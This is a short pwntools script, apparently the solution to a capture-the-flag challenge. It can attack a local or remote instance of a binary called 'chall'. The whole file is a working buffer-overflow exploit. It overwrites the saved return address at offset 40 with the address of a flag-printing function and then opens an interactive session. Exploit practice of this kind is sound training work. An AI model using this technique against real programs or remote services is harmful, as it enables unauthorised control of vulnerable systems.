from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"

io = start()
offset = 40
flag_function_address = 0x4012f2
payload = flat({offset: flag_function_address})

io.sendline(payload)
io.interactive()